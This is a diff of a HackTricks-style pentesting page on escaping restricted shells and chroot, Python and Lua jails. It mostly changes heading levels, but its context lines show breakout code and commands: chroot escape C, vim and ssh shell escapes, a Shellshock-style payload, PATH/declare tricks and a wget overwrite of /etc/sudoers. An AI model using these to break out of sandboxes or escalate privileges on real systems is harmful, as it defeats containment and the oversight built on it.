@@ -17,13 +17,11 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 </details>
 
 
-# Escaping from Jails
-
-## **GTFOBins**
+# **GTFOBins**
 
 **Search in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **if you can execute any binary with "Shell" property**
 
-## Chroot limitation
+# Chroot limitation
 
 From [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations):  The chroot mechanism is **not intended to defend** against intentional tampering by **privileged** (**root**) **users**. On most systems, chroot contexts do not stack properly and chrooted programs **with sufficient privileges may perform a second chroot to break out**.
 
@@ -76,9 +74,9 @@ chroot ".";
 system("/bin/bash");
 ```
 
-## Bash Jails
+# Bash Jails
 
-### Enumeration
+## Enumeration
 
 Get info about the jail:
 
@@ -90,7 +88,7 @@ export
 pwd
 ```
 
-### Modify PATH
+## Modify PATH
 
 Check if you can modify the PATH env variable
 
@@ -100,14 +98,14 @@ PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change
 echo /home/* #List directory
 ```
 
-### Using vim
+## Using vim
 
 ```bash
 :set shell=/bin/sh
 :shell
 ```
 
-### Create script
+## Create script
 
 Check if you can create an executable file with _/bin/bash_ as content
 
@@ -116,7 +114,7 @@ red /bin/bash
 > w wx/path #Write /bin/bash in a writable and executable path
 ```
 
-### Get bash from SSH
+## Get bash from SSH
 
 If you are accessing via ssh you can use this trick to execute a bash shell:
 
@@ -126,7 +124,7 @@ ssh user@<IP> -t "bash --noprofile -i"
 ssh user@<IP> -t "() { :; }; sh -i "
 ```
 
-### Declare
+## Declare
 
 ```bash
 declare -n PATH; export PATH=/bin;bash -i
@@ -134,7 +132,7 @@ declare -n PATH; export PATH=/bin;bash -i
 BASH_CMDS[shell]=/bin/bash;shell -i
 ```
 
-### Wget
+## Wget
 
 You can overwrite for example sudoers file
 
@@ -142,7 +140,7 @@ You can overwrite for example sudoers file
 wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 ```
 
-### Other tricks
+## Other tricks
 
 [**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
 [https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells**]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
@@ -153,7 +151,7 @@ wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
 [bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
 {% endcontent-ref %}
 
-## Python Jails
+# Python Jails
 
 Tricks about escaping from python jails in the following page:
 
@@ -161,7 +159,7 @@ Tricks about escaping from python jails in the following page:
 [bypass-python-sandboxes](../../misc/basic-python/bypass-python-sandboxes/)
 {% endcontent-ref %}
 
-## Lua Jails
+# Lua Jails
 
 In this page you can find the global functions you have access to inside lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)
 
